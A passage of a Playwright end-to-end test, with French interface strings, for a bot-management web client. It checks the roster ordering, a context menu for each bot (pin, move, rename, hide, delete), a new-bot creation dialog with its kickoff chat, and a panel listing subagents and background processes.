  await page.locator('.login-card').waitFor({ timeout: 5_000 })
  await page.getByText('Identifiants enregistrés refusés').waitFor({ timeout: 2_000 })
  if (existsSync(SAVED_LOGIN_FILE)) throw new Error('Des identifiants refusés doivent être oubliés.')
  loginRefused = false
  await page.getByLabel('Identifiant Hermes').fill('test')
  await page.getByLabel('Mot de passe').fill('test')
  await page.getByRole('button', { name: 'Ouvrir mes bots' }).click()
  await page.locator('[data-bot=orion].is-selected').waitFor({ timeout: 10_000 })
  await connection.getByText('Hermes connecté').waitFor({ timeout: 5_000 })
  if (await page.locator('.toast').count()) throw new Error('Le message de session expirée reste affiché après connexion.')

  // Ordering: sections by group, single list by activity with the most recent bot first.
  const rosterOrder = () => page.locator('.bot-row:not([data-bot^="local:"])').evaluateAll((rows) => rows.map((row) => row.dataset.bot).join())
  await page.locator('.section-heading').first().waitFor({ timeout: 3_000 })
  if (await rosterOrder() !== 'nova,orion') throw new Error(`Ordre par groupes : ${await rosterOrder()}`)
  await page.getByRole('button', { name: 'Activité', exact: true }).click()
  await page.locator('.section-heading').first().waitFor({ state: 'detached', timeout: 3_000 })
  if (await rosterOrder() !== 'orion,nova') throw new Error(`Ordre par activité : ${await rosterOrder()}`)
  await page.getByRole('button', { name: 'Groupes', exact: true }).click()
  await page.locator('.section-heading').first().waitFor({ timeout: 3_000 })
  if (await rosterOrder() !== 'nova,orion') throw new Error(`Retour aux groupes : ${await rosterOrder()}`)

  // Bot menu (right click): keyboard, Esc, outside click, window edge, then each action on a bot added for these steps.
  profiles.splice(profiles.findIndex((item) => item.is_default), 0, atlasProfile)
  await page.reload({ waitUntil: 'domcontentloaded' })
  const atlasRow = page.locator('[data-bot=atlas]')
  await atlasRow.waitFor({ timeout: 15_000 })
  const botMenu = page.locator('.bot-menu:not(.is-sub)')
  const sectionsMenu = page.getByRole('menu', { name: 'Sections' })
  const menuItem = (name) => botMenu.getByRole('menuitem', { name, exact: true })
  const focusedText = () => page.evaluate(() => document.activeElement?.textContent || '')
  const openAtlasMenu = async () => {
    await atlasRow.click({ button: 'right' })
    await botMenu.waitFor({ timeout: 3_000 })
    await page.waitForFunction(() => document.activeElement?.closest('.bot-menu'), null, { timeout: 2_000 })
  }
  const inSection = (name) => page.locator('.bot-section', { has: page.locator('.section-heading', { hasText: name }) }).locator('[data-bot=atlas]')
  await openAtlasMenu()
  if (await botMenu.getAttribute('aria-label') !== 'Actions pour Atlas') throw new Error(`Nom du menu : ${await botMenu.getAttribute('aria-label')}`)
  const menuLabels = (await botMenu.locator('[role^="menuitem"]').allTextContents()).join(' | ')
  if (menuLabels !== 'Épingler | Déplacer vers | Marquer comme lu | Renommer le bot | Copier l’ID de conversation | Masquer de la barre latérale | Supprimer') throw new Error(`Menu du bot : ${menuLabels}`)
  if (await menuItem('Marquer comme lu').getAttribute('aria-disabled') !== 'true') throw new Error('« Marquer comme lu » est actif sans message non lu.')
  if (await focusedText() !== 'Épingler') throw new Error(`Le menu ne prend pas le clavier : ${await focusedText()}`)
  await page.keyboard.press('ArrowDown')
  await page.keyboard.press('ArrowDown')
  if (await focusedText() !== 'Renommer le bot') throw new Error(`Les flèches ne sautent pas l’élément inactif : ${await focusedText()}`)
  await page.keyboard.press('ArrowUp')
  await page.keyboard.press('ArrowRight')
  await sectionsMenu.waitFor({ timeout: 2_000 })
  await page.waitForFunction(() => document.activeElement?.closest('[role=menu]')?.getAttribute('aria-label') === 'Sections', null, { timeout: 2_000 })
  await page.keyboard.press('ArrowLeft')
  await sectionsMenu.waitFor({ state: 'detached', timeout: 2_000 })
  if (await focusedText() !== 'Déplacer vers') throw new Error(`← ne revient pas au menu : ${await focusedText()}`)
  await menuItem('Déplacer vers').hover()
  await sectionsMenu.waitFor({ timeout: 2_000 })
  await delay(300)
  await page.screenshot({ path: `${SCREENSHOTS}bot-menu.png` })
  await page.evaluate(() => { document.documentElement.dataset.theme = 'dark' })
  await delay(300)
  await page.screenshot({ path: `${SCREENSHOTS}bot-menu-dark.png` })
  await page.evaluate(() => { document.documentElement.dataset.theme = 'light' })
  await page.keyboard.press('Escape')
  await sectionsMenu.waitFor({ state: 'detached', timeout: 2_000 })
  await page.keyboard.press('Escape')
  await botMenu.waitFor({ state: 'detached', timeout: 2_000 })
  await page.waitForFunction(() => document.activeElement?.getAttribute('data-bot') === 'atlas', null, { timeout: 2_000 })
  await openAtlasMenu()
  await page.locator('.sidebar-filter-row > span').first().click()
  await botMenu.waitFor({ state: 'detached', timeout: 2_000 })
  // Near the bottom of the window the menu opens upwards, and stays inside.
  const atlasBox = await atlasRow.boundingBox()
  await page.setViewportSize({ width: 1280, height: Math.round(atlasBox.y + atlasBox.height + 90) })
  await atlasRow.click({ button: 'right', position: { x: atlasBox.width - 8, y: atlasBox.height - 4 } })
  await botMenu.waitFor({ timeout: 3_000 })
  const edgeBox = await botMenu.boundingBox()
  const edgeView = page.viewportSize()
  if (edgeBox.y < 0 || edgeBox.y + edgeBox.height > edgeView.height || edgeBox.x + edgeBox.width > edgeView.width) throw new Error(`Menu hors de la fenêtre : ${JSON.stringify(edgeBox)} dans ${JSON.stringify(edgeView)}`)
  await page.keyboard.press('Escape')
  await botMenu.waitFor({ state: 'detached', timeout: 2_000 })
  await page.setViewportSize({ width: 1280, height: 800 })

  // Move to: the card is written with the revision read; another app's write in between means one re-read.
  configureCalls.length = 0
  configureConflicts = 1
  await openAtlasMenu()
  await menuItem('Déplacer vers').hover()
  await sectionsMenu.waitFor({ timeout: 2_000 })
  const sectionChoices = await sectionsMenu.locator('[role="menuitemradio"]').evaluateAll((items) => items.map((item) => `${item.textContent}${item.getAttribute('aria-checked') === 'true' ? '*' : ''}`))
  if (sectionChoices.join(' | ') !== 'Direction | Produit* | Non classés') throw new Error(`Sections proposées : ${sectionChoices.join(' | ')}`)
  await sectionsMenu.getByRole('menuitemradio', { name: 'Direction' }).click()
  await inSection('Direction').waitFor({ timeout: 5_000 })
  const movedCard = configureCalls[1]?.ui_meta?.['hermes-bots']
  if (configureCalls.length !== 2 || configureCalls[0].ui_meta_expected_revisions['hermes-bots'] !== 3 || configureCalls[1].ui_meta_expected_revisions['hermes-bots'] !== 4) throw new Error(`Écriture de la section : ${JSON.stringify(configureCalls)}`)
  if (configureCalls[1].name !== 'atlas' || movedCard.sectionId !== 'direction' || movedCard.sectionName !== 'Direction' || movedCard.title !== 'Atlas' || movedCard.shape !== 'hex' || movedCard.created !== 1) throw new Error(`Carte déplacée : ${JSON.stringify(movedCard)}`)
  // New section: a name, Enter, and the bot is filed there.
  configureCalls.length = 0
  await openAtlasMenu()
  await menuItem('Déplacer vers').hover()
  await sectionsMenu.getByRole('menuitem', { name: 'Nouvelle section…' }).click()
  const sectionField = sectionsMenu.getByRole('textbox', { name: 'Nom de la section' })
  await sectionField.fill('Voyage')
  await sectionField.press('Enter')
  await inSection('Voyage').waitFor({ timeout: 5_000 })
  if (!/^sec-/.test(configureCalls[0]?.ui_meta?.['hermes-bots']?.sectionId || '')) throw new Error(`Nouvelle section : ${JSON.stringify(configureCalls)}`)

  // Pin: a "Pinned" group at the top, in both sorts, kept after a reload, with no copy below; nothing goes to Hermes.
  configureCalls.length = 0
  const pinnedGroup = page.locator('.bot-section.is-pinned')
  const firstHeading = () => page.locator('.section-heading span').first().textContent()
  await openAtlasMenu()
  await menuItem('Épingler').click()
  await pinnedGroup.locator('[data-bot=atlas]').waitFor({ timeout: 3_000 })
  if (await firstHeading() !== 'Épinglés') throw new Error(`Premier groupe : ${await firstHeading()}`)
  if (await atlasRow.count() !== 1 || await inSection('Voyage').count()) throw new Error('Un bot épinglé est répété dans sa section.')
  if (configureCalls.length) throw new Error('Épingler a écrit chez Hermes.')
  await page.reload({ waitUntil: 'domcontentloaded' })
  await pinnedGroup.locator('[data-bot=atlas]').waitFor({ timeout: 15_000 })
  await page.getByRole('button', { name: 'Activité', exact: true }).click()
  await page.waitForFunction(() => document.querySelectorAll('.section-heading').length === 1, null, { timeout: 3_000 })
  if (await firstHeading() !== 'Épinglés' || await pinnedGroup.locator('[data-bot]').count() !== 1) throw new Error('Le groupe épinglé manque dans le classement par activité.')
  await page.getByRole('button', { name: 'Groupes', exact: true }).click()
  await page.locator('.section-heading', { hasText: 'Direction' }).waitFor({ timeout: 3_000 })

  // Rename: the display name only, the profile keeps its name.
  configureCalls.length = 0
  await openAtlasMenu()
  if (await menuItem('Désépingler').count() !== 1) throw new Error('Le menu d’un bot épinglé ne propose pas de le désépingler.')
  await menuItem('Renommer le bot').click()
  const renameDialog = page.getByRole('dialog', { name: 'Renommer Atlas' })
  await renameDialog.waitFor({ timeout: 3_000 })
  const nameField = renameDialog.getByRole('textbox', { name: 'Nom affiché' })
  if (await nameField.inputValue() !== 'Atlas') throw new Error(`Nom proposé : ${await nameField.inputValue()}`)
  await renameDialog.getByText('Le profil Hermes reste « atlas »', { exact: false }).waitFor({ timeout: 2_000 })
  await nameField.fill('Atlas Prime')
  await nameField.press('Enter')
  await renameDialog.waitFor({ state: 'detached', timeout: 5_000 })
  await atlasRow.locator('.bot-row-name').getByText('Atlas Prime', { exact: true }).waitFor({ timeout: 3_000 })
  if (configureCalls.at(-1)?.name !== 'atlas' || configureCalls.at(-1).ui_meta['hermes-bots'].title !== 'Atlas Prime' || configureCalls.at(-1).ui_meta['hermes-bots'].sectionName !== 'Voyage') throw new Error(`Renommage : ${JSON.stringify(configureCalls)}`)

  // Mark as read: only when there is something unread.
  for (const client of wss.clients) send(client, event('chat-atlas', 'message.complete', { text: 'Itinéraire prêt.' }))
  await atlasRow.locator('.unread-badge').waitFor({ timeout: 3_000 })
  await openAtlasMenu()
  await menuItem('Marquer comme lu').click()
  await atlasRow.locator('.unread-badge').waitFor({ state: 'detached', timeout: 3_000 })

  // Copy the Bot Chat id, with a short confirmation.
  await openAtlasMenu()
  await menuItem('Copier l’ID de conversation').click()
  await botMenu.getByText('ID de conversation copié').waitFor({ timeout: 2_000 })
  await botMenu.waitFor({ state: 'detached', timeout: 3_000 })
  const copiedId = await page.evaluate(() => navigator.clipboard.readText())
  if (copiedId !== 'chat-atlas') throw new Error(`ID copié : ${copiedId}`)

  // A gateway without the method: a clear message, and the roster does not change.
  configureMissing = true
  await openAtlasMenu()
  await menuItem('Masquer de la barre latérale').click()
  await page.locator('.toast').getByText('Ce Hermes ne sait pas modifier les bots', { exact: false }).waitFor({ timeout: 5_000 })
  if (await atlasRow.count() !== 1 || await atlasRow.evaluate((row) => row.classList.contains('is-hidden'))) throw new Error('Un masquage refusé par Hermes a changé le roster.')
  await page.locator('.toast button').click()
  configureMissing = false

  // Hide: in the card, as Hermes Desktop does; the hidden bots view brings it back.
  configureCalls.length = 0
  await openAtlasMenu()
  await menuItem('Masquer de la barre latérale').click()
  await atlasRow.waitFor({ state: 'detached', timeout: 5_000 })
  if (configureCalls.at(-1)?.ui_meta?.['hermes-bots']?.hidden !== true) throw new Error(`Masquage : ${JSON.stringify(configureCalls)}`)
  await page.getByRole('button', { name: 'Afficher les bots cachés' }).click()
  await page.locator('[data-bot=atlas].is-hidden').waitFor({ timeout: 3_000 })
  await openAtlasMenu()
  await menuItem('Afficher dans la barre latérale').click()
  await page.locator('[data-bot=atlas]:not(.is-hidden)').waitFor({ timeout: 5_000 })
  if (configureCalls.at(-1)?.ui_meta?.['hermes-bots']?.hidden !== false) throw new Error(`Retour du bot masqué : ${JSON.stringify(configureCalls)}`)

  // Delete: a dialog that says what happens; cancelled, nothing is written; confirmed, the bot leaves the roster
  // for good, its profile stays, its previous card is kept beside the mark.
  configureCalls.length = 0
  const deleteDialog = page.getByRole('alertdialog', { name: 'Supprimer Atlas Prime de HermesBot ?' })
  await openAtlasMenu()
  await menuItem('Supprimer').click()
  await deleteDialog.waitFor({ timeout: 3_000 })
  await deleteDialog.getByText('hermes profile delete atlas', { exact: true }).waitFor({ timeout: 2_000 })
  await deleteDialog.getByText('Rien n’est effacé', { exact: false }).waitFor({ timeout: 2_000 })
  await delay(300)
  await page.screenshot({ path: `${SCREENSHOTS}bot-delete.png` })
  await page.keyboard.press('Escape')
  await deleteDialog.waitFor({ state: 'detached', timeout: 2_000 })
  if (configureCalls.length) throw new Error('Annuler la suppression a écrit chez Hermes.')
  await openAtlasMenu()
  await menuItem('Supprimer').click()
  await deleteDialog.getByRole('button', { name: 'Supprimer de HermesBot' }).click()
  await deleteDialog.waitFor({ state: 'detached', timeout: 5_000 })
  await atlasRow.waitFor({ state: 'detached', timeout: 5_000 })
  const removal = configureCalls.at(-1)
  const removedMark = removal?.ui_meta?.['hermesbot-removed']
  if (removal?.name !== 'atlas' || removal.ui_meta['hermes-bots'].hidden !== true || removedMark?.card?.title !== 'Atlas Prime' || removedMark.card.hidden !== false || !removedMark.removed_at
    || removal.ui_meta_expected_revisions?.['hermesbot-removed'] !== 0 || typeof removal.ui_meta_expected_revisions['hermes-bots'] !== 'number') throw new Error(`Suppression : ${JSON.stringify(removal)}`)
  if ((await page.evaluate(() => JSON.parse(localStorage.getItem('hermesbot-settings')).pinnedBots)).includes('atlas')) throw new Error('Un bot supprimé reste épinglé.')
  await page.reload({ waitUntil: 'domcontentloaded' })
  await page.locator('[data-bot=nova]').waitFor({ timeout: 15_000 })
  if (await atlasRow.count()) throw new Error('Un bot supprimé revient au rechargement.')

  // New bot (the "+" at the top of the sidebar): a name, then a look, then its chat, where it introduces itself and
  // asks for its role. Atlas, deleted just above, keeps its Hermes profile: its name is still taken there.
  const KICKOFF = 'New bot: introduce yourself and ask me what your role is.'
  const newBotButton = page.getByRole('button', { name: 'Nouveau bot', exact: true })
  const newBotDialog = page.getByRole('dialog', { name: 'Nouveau bot' })
  const botNameField = newBotDialog.getByRole('textbox', { name: 'Nom' })
  const nameHint = newBotDialog.locator('.new-bot-hint')
  const nextButton = newBotDialog.getByRole('button', { name: 'Suivant' })
  const createButton = newBotDialog.getByRole('button', { name: 'Créer' })
  const colorChoices = newBotDialog.getByRole('radiogroup', { name: 'Couleur' })
  const shapeChoices = newBotDialog.getByRole('radiogroup', { name: 'Forme' })
  await newBotButton.click()
  await newBotDialog.waitFor({ timeout: 3_000 })
  await page.waitForFunction(() => document.activeElement?.closest('[role=dialog]') && document.activeElement.tagName === 'INPUT', null, { timeout: 2_000 })
  await page.keyboard.press('Escape')
  await newBotDialog.waitFor({ state: 'detached', timeout: 2_000 })
  await page.waitForFunction(() => document.activeElement?.getAttribute('aria-label') === 'Nouveau bot', null, { timeout: 2_000 })
  await newBotButton.click()
  await botNameField.waitFor({ timeout: 3_000 })
  if (!(await nextButton.isDisabled())) throw new Error('Suivant est actif sans nom.')
  // Taken in the roster, taken by a profile the roster hides, reserved, kept by a deleted bot, nothing usable.
  for (const [typed, expected] of [['Nova', 'Hermes a déjà un profil nommé « nova »'], ['Notify', 'Hermes a déjà un profil nommé « notify »'], ['Default', '« default » est réservé par Hermes'], ['Atlas', '« atlas » existe encore dans Hermes'], ['!!!', 'Mets au moins une lettre ou un chiffre']]) {
    await botNameField.fill(typed)
    await nameHint.filter({ hasText: expected }).waitFor({ timeout: 3_000 })
    if (!(await nextButton.isDisabled()) || await botNameField.getAttribute('aria-invalid') !== 'true') throw new Error(`« ${typed} » n’est pas signalé.`)
  }
  await botNameField.fill('Atlas')
  await nameHint.filter({ hasText: 'efface-le pour de bon avec hermes profile delete atlas' }).waitFor({ timeout: 2_000 })
  // A name another app takes meanwhile: Hermes refuses it (4062), the dialog goes back to the name and says so.
  await botNameField.fill('Iris')
  await nameHint.getByText('Profil Hermes : iris', { exact: true }).waitFor({ timeout: 2_000 })
  profiles.splice(profiles.findIndex((item) => item.is_default), 0, { name: 'iris', model: 'claude-opus-5-5', description: '', ui_meta: {} })
  await botNameField.press('Enter')
  await colorChoices.waitFor({ timeout: 2_000 })
  await createButton.click()
  await nameHint.filter({ hasText: 'Hermes a déjà un profil nommé « iris »' }).waitFor({ timeout: 5_000 })
  await page.waitForFunction(() => document.activeElement?.tagName === 'INPUT' && document.activeElement.closest('[role=dialog]'), null, { timeout: 2_000 })
  profiles.splice(profiles.findIndex((item) => item.name === 'iris'), 1)
  if (createCalls.length !== 1 || createCalls[0].name !== 'iris') throw new Error(`Création refusée : ${JSON.stringify(createCalls)}`)
  // A free name: the profile name is shown as it will be created.
  await botNameField.fill('Léa Martin')
  await nameHint.getByText('Profil Hermes : lea-martin', { exact: true }).waitFor({ timeout: 2_000 })
  await delay(300)
  await page.screenshot({ path: `${SCREENSHOTS}new-bot-name.png` })
  await botNameField.press('Enter')
  await colorChoices.waitFor({ timeout: 2_000 })
  await page.waitForFunction(() => document.activeElement?.getAttribute('role') === 'radio' && document.activeElement.getAttribute('aria-checked') === 'true', null, { timeout: 2_000 })
  // Preselected: a color and a shape the bots on screen do not use yet. The preview follows every choice.
  const previewLook = () => newBotDialog.locator('.new-bot-preview .bot-avatar').evaluate((avatar) => ({ color: avatar.style.getPropertyValue('--avatar-color'), shape: avatar.querySelector('svg g')?.innerHTML || '' }))
  const checkedName = (group) => group.locator('[aria-checked="true"]').getAttribute('aria-label')
  if (await checkedName(colorChoices) !== 'Violet' || await checkedName(shapeChoices) !== 'Galet') throw new Error(`Apparence proposée : ${await checkedName(colorChoices)}, ${await checkedName(shapeChoices)}`)
  const firstLook = await previewLook()
  await colorChoices.getByRole('radio', { name: 'Vert' }).click()
  await shapeChoices.getByRole('radio', { name: 'Nuage' }).click()
  const chosenLook = await previewLook()
  if (chosenLook.color !== '#3FA66B' || !chosenLook.shape.includes('M11 34a8 8') || chosenLook.shape === firstLook.shape) throw new Error(`Aperçu : ${JSON.stringify({ firstLook, chosenLook })}`)
  // The keyboard of a radio group: arrows move the choice.
  await shapeChoices.getByRole('radio', { name: 'Nuage' }).press('ArrowRight')
  if (await checkedName(shapeChoices) !== 'Goutte') throw new Error(`→ dans les formes : ${await checkedName(shapeChoices)}`)
  await page.keyboard.press('ArrowLeft')
  if (await checkedName(shapeChoices) !== 'Nuage') throw new Error(`← dans les formes : ${await checkedName(shapeChoices)}`)
  await newBotDialog.getByText('Léa Martin se présentera et te demandera son rôle tout de suite', { exact: false }).waitFor({ timeout: 2_000 })
  await delay(300)
  await page.screenshot({ path: `${SCREENSHOTS}new-bot-look.png` })
  await page.evaluate(() => { document.documentElement.dataset.theme = 'dark' })
  await delay(300)
  await page.screenshot({ path: `${SCREENSHOTS}new-bot-look-dark.png` })
  await page.evaluate(() => { document.documentElement.dataset.theme = 'light' })
  // Create, clicked twice: one profile, its card, then its chat, selected.
  createCalls.length = 0
  configureCalls.length = 0
  await createButton.dblclick()
  await newBotDialog.waitFor({ state: 'detached', timeout: 10_000 })
  const created = createCalls[0]
  if (createCalls.length !== 1 || created.name !== 'lea-martin' || created.share_auth !== true || 'clone_from' in created || !String(created.soul).startsWith('# Léa Martin\n')) throw new Error(`Création : ${JSON.stringify(createCalls)}`)
  const leaCard = configureCalls.find((call) => call.name === 'lea-martin')?.ui_meta?.['hermes-bots']
  if (!leaCard || leaCard.title !== 'Léa Martin' || leaCard.shape !== 'cloud' || leaCard.color !== '#3FA66B' || leaCard.imageKind !== 'shape' || typeof leaCard.created !== 'number') throw new Error(`Fiche du nouveau bot : ${JSON.stringify(configureCalls)}`)
  const leaRow = page.locator('[data-bot="lea-martin"]')
  await page.locator('[data-bot="lea-martin"].is-selected').waitFor({ timeout: 5_000 })
  await page.locator('.bot-section', { has: page.locator('.section-heading', { hasText: 'Non classés' }) }).locator('[data-bot="lea-martin"]').waitFor({ timeout: 3_000 })
  const rowLook = await leaRow.locator('.bot-avatar').first().evaluate((avatar) => ({ color: avatar.style.getPropertyValue('--avatar-color'), shape: avatar.querySelector('svg g')?.innerHTML || '' }))
  if (rowLook.color !== '#3FA66B' || !rowLook.shape.includes('M11 34a8 8')) throw new Error(`Avatar du nouveau bot : ${JSON.stringify(rowLook)}`)
  // It works right away (the work line), then asks for its role.
  await page.locator('.working-row .working-caption').waitFor({ timeout: 5_000 })
  if (await page.locator('.chat-empty .suggestions').count()) throw new Error('Des suggestions restent sous la ligne de travail du nouveau bot.')
  await delay(300)
  await page.screenshot({ path: `${SCREENSHOTS}new-bot-working.png` })
  await page.locator('.message-assistant').getByText('Quel rôle veux-tu me confier ?', { exact: false }).waitFor({ timeout: 6_000 })
  await page.locator('.working-row').waitFor({ state: 'detached', timeout: 3_000 })
  await delay(300)
  await page.screenshot({ path: `${SCREENSHOTS}new-bot-chat.png` })
  if (await page.locator('.messages-column').getByText('New bot:', { exact: false }).count()) throw new Error('La phrase de lancement est dans le fil.')
  if ((await leaRow.innerText()).includes('New bot:')) throw new Error('La phrase de lancement est en aperçu du roster.')
  const kickoffs = newBotPrompts.filter((call) => call.session_id === 'chat-lea-martin')
  if (kickoffs.length !== 1 || kickoffs[0].text !== KICKOFF || kickoffs[0].queued !== false || !kickoffs[0].api_text?.includes('Your name is "Léa Martin"') || !kickoffs[0].api_text.includes('in French') || kickoffs[0].api_text.includes('caveman')) throw new Error(`Premier tour : ${JSON.stringify(newBotPrompts)}`)
  if (sessionCreateCalls.filter((call) => call.profile === 'lea-martin').length !== 1 || !sessionTitleCalls.some((call) => call.session_id === 'chat-lea-martin' && call.title === 'Bot Chat')) throw new Error(`Bot Chat du nouveau bot : ${JSON.stringify({ sessionCreateCalls, sessionTitleCalls })}`)
  // The kickoff sentence lives in Activity.
  const detailsWereOpen = await page.locator('.details-panel').isVisible()
  if (!detailsWereOpen) await page.getByRole('button', { name: 'Afficher les détails du bot' }).click()
  await page.locator('.details-panel').getByRole('tab', { name: /Activité/ }).click()
  await page.locator('.details-panel .activity-row').getByText(KICKOFF, { exact: true }).waitFor({ timeout: 3_000 })
  await page.locator('.details-panel').getByRole('tab', { name: 'Routines' }).click()
  if (!detailsWereOpen) await page.getByRole('button', { name: 'Afficher les détails du bot' }).click()
  // After a reload: the bot is still there, its question too, and it never introduced itself twice.
  await page.reload({ waitUntil: 'domcontentloaded' })
  await leaRow.waitFor({ timeout: 15_000 })
  if ((await leaRow.innerText()).includes('New bot:')) throw new Error('La phrase de lancement est en aperçu après rechargement.')
  await leaRow.click()
  await page.locator('[data-bot="lea-martin"].is-selected').waitFor({ timeout: 3_000 })
  await page.locator('.message-assistant').getByText('Quel rôle veux-tu me confier ?', { exact: false }).waitFor({ timeout: 5_000 })
  await delay(1_000)
  if (newBotPrompts.filter((call) => call.session_id === 'chat-lea-martin').length !== 1) throw new Error('Le nouveau bot s’est présenté une deuxième fois.')
  if (await page.locator('.messages-column').getByText('New bot:', { exact: false }).count()) throw new Error('La phrase de lancement est dans le fil après rechargement.')
  profiles.splice(profiles.findIndex((item) => item.name === 'lea-martin'), 1)
  delete newBotHistory['chat-lea-martin']
  await page.reload({ waitUntil: 'domcontentloaded' })
  await page.locator('[data-bot=nova]').waitFor({ timeout: 15_000 })
  profiles.splice(profiles.indexOf(atlasProfile), 1)
  // The local chat is not a Hermes profile: no bot menu.
  await page.locator(`[data-bot="local:ollama"]`).click({ button: 'right' })
  await delay(200)
  if (await page.locator('.bot-menu').count()) throw new Error('Le chat local a un menu de bot.')
  await page.keyboard.press('Escape')

  // Standing by: no turn, but a subagent and background processes still running. Profile-wide first
  // (`subagent.roster`), then the open conversation's own reads (`process.list`, `subagent.list`) and events.
  await page.locator('[data-bot=nova]').click()
  await page.locator('[data-bot=nova].is-selected').waitFor({ timeout: 3_000 })
  backgroundCalls.length = 0
  subagentRosterByProfile.orion = [{ session_id: 'chat-orion', subagents: 1, background: 1 }, { session_id: 'cron-orion', subagents: 0, background: 1 }]
  liveStatusByProfile.orion = 'working'
  await page.locator('[data-bot=orion] .bot-row-status.is-working').waitFor({ timeout: 9_000 })
  delete liveStatusByProfile.orion
  // The turn's end brings the read forward: no need to wait for the 15 s round.
  await page.locator('[data-bot=orion] .bot-row-status.is-standby').getByText('En veille').waitFor({ timeout: 9_000 })
  const standbyTitle = await page.locator('[data-bot=orion]').getAttribute('title')
  if (standbyTitle !== '1 sous-agent · 2 processus en arrière-plan') throw new Error(`Survol du bot en veille : ${standbyTitle}`)
  await page.locator('[data-bot=orion] .live-avatar.is-standby').waitFor({ timeout: 2_000 })
  if (await page.locator('[data-bot=orion] img.live-avatar-motion').count()) throw new Error('Un bot en veille ne doit pas être animé.')
  await page.locator('.working-strip').getByText('Tous les bots sont disponibles').waitFor({ timeout: 2_000 })
  const rosterReads = backgroundCalls.filter((call) => call.method === 'subagent.roster')
  if (!rosterReads.some((call) => call.params.profile === 'orion') || rosterReads.some((call) => Object.keys(call.params).join() !== 'profile')) throw new Error(`subagent.roster : ${JSON.stringify(rosterReads)}`)
  // Working keeps the priority over standing by.
  liveStatusByProfile.orion = 'working'
  await page.locator('[data-bot=orion] .bot-row-status.is-working').waitFor({ timeout: 9_000 })
  delete liveStatusByProfile.orion
  await page.locator('[data-bot=orion] .bot-row-status.is-standby').waitFor({ timeout: 9_000 })

  processListBySession['chat-orion'] = [
    { session_id: 'proc_dev', command: 'npm run dev', status: 'running', started_epoch: Date.now() / 1000 - 300 },
    { session_id: 'proc_old', command: 'ls', status: 'exited', exit_code: 0 },
  ]
  subagentListBySession['chat-orion'] = [{ subagent_id: 'sa-offres', parent_id: null, depth: 0, goal: 'Comparer les offres d’hébergement', delegation_id: 'd-1', model: 'claude-sonnet-5-5', started_at: Date.now() / 1000 - 75, status: 'running', tool_count: 3, last_tool: 'web_search', accepting_steer: true }]
  await page.locator('[data-bot=orion]').click()
  await page.locator('[data-bot=orion].is-selected').waitFor({ timeout: 3_000 })
  await page.locator('.chat-identity.is-standby .chat-status').getByText('En veille').waitFor({ timeout: 5_000 })
  const panel = page.locator('.subagents-panel')
  await panel.getByText('Comparer les offres d’hébergement').waitFor({ timeout: 6_000 })
  await panel.locator('.subagents-counts').getByText('1 en cours').waitFor({ timeout: 2_000 })
  await panel.locator('.subagents-counts').getByText('1 processus en arrière-plan').waitFor({ timeout: 2_000 })
  await panel.getByText('Dernier outil : Cherche sur le web').waitFor({ timeout: 2_000 })
  for (const call of backgroundCalls.filter((item) => item.method === 'process.list' || item.method === 'subagent.list')) {
    if (JSON.stringify(call.params) !== JSON.stringify({ profile: 'orion', session_id: 'chat-orion' })) throw new Error(`${call.method} : ${JSON.stringify(call.params)}`)
  }
  if (await page.locator('.subagents-panel').getByText('npm run dev').count()) throw new Error('La commande d’un processus est affichée.')
  // Events of a child delegated in the background, as the gateway relays them.
  const delegated = { goal: 'Résumer les avis clients', task_count: 2, task_index: 1, subagent_id: 'sa-avis', depth: 0, model: 'claude-sonnet-5-5', tool_count: 0 }
  broadcast(event('chat-orion', 'subagent.spawn_requested', delegated))
  broadcast(event('chat-orion', 'subagent.start', delegated))
  broadcast(event('chat-orion', 'subagent.tool', { ...delegated, tool_name: 'read_file', tool_preview: 'avis-secret.md', text: 'avis-secret.md', tool_count: 1 }))
  await panel.getByText('Résumer les avis clients').waitFor({ timeout: 3_000 })
  await panel.locator('.subagents-counts').getByText('2 en cours').waitFor({ timeout: 2_000 })
  if (await panel.getByText('avis-secret.md').count()) throw new Error('Les arguments d’un outil sont affichés.')
  broadcast(event('chat-orion', 'subagent.complete', { ...delegated, status: 'completed', summary: 'Les clients aiment la vitesse, moins le prix.', duration_seconds: 64, tool_count: 5, output_tail: [{ tool: 'read_file', preview: '120 avis lus', is_error: false }] }))
  await panel.getByText('Les clients aiment la vitesse, moins le prix.').waitFor({ timeout: 3_000 })
  await panel.locator('.subagents-counts').getByText('1 fini').waitFor({ timeout: 2_000 })
  await panel.locator('.subagent-row.is-completed').getByText('1 min 04 s').waitFor({ timeout: 2_000 })
  const headerTitle = await page.locator('.chat-identity').getAttribute('title')
  if (headerTitle !== '1 sous-agent · 2 processus en arrière-plan') throw new Error(`Survol de l’en-tête : ${headerTitle}`)
  // Opened, a finished child stays while it is read: its whole prompt, then the last tool results it gave.
  const reviewsRow = panel.locator('.subagent-row', { hasText: 'Résumer les avis' })
  await reviewsRow.locator('.subagent-main').click()
  await reviewsRow.locator('.subagent-prompt').getByText('Résumer les avis clients').waitFor({ timeout: 2_000 })
  await reviewsRow.getByText('Derniers résultats d’outils').waitFor({ timeout: 3_000 })
  await reviewsRow.getByText('120 avis lus').waitFor({ timeout: 2_000 })
  await delay(300)
  await page.screenshot({ path: `${SCREENSHOTS}subagents-panel.png` })
  // On click: the end of the live transcript of a running child.
  subagentTailById['sa-offres'] = 'Lecture des offres.\nComparaison faite : l’offre B coûte 20 % de moins.'
  await panel.locator('.subagent-row', { hasText: 'Comparer les offres' }).locator('.subagent-main').click()
  await panel.locator('.subagent-tail pre').getByText('l’offre B coûte 20 % de moins').waitFor({ timeout: 3_000 })
  const tailCall = backgroundCalls.filter((item) => item.method === 'subagent.tail').at(-1)
  if (JSON.stringify(tailCall?.params) !== JSON.stringify({ profile: 'orion', session_id: 'chat-orion', subagent_id: 'sa-offres' })) throw new Error(`subagent.tail : ${JSON.stringify(tailCall?.params)}`)
  await page.screenshot({ path: `${SCREENSHOTS}subagents-tail.png` })
  await panel.locator('.subagent-row', { hasText: 'Comparer les offres' }).locator('.subagent-main').click()
  // Past its few seconds, the opened child is still there; closed, it leaves the chat.
  await delay(8_500)
  if (!(await reviewsRow.count())) throw new Error('Un sous-agent fini ouvert ne doit pas quitter le chat pendant qu’on le lit.')
  await reviewsRow.locator('.subagent-main').click()
  await reviewsRow.waitFor({ state: 'detached', timeout: 2_000 })
  if (await panel.locator('.subagents-counts').getByText('fini').count()) throw new Error('Un sous-agent fini reste compté dans le chat.')
  // History: every child of the conversation in the details panel, the history's included.
  await panel.getByRole('button', { name: /Historique/ }).click()
  const historyTab = page.locator('.details-panel').getByRole('tab', { name: /Sous-agents/ })
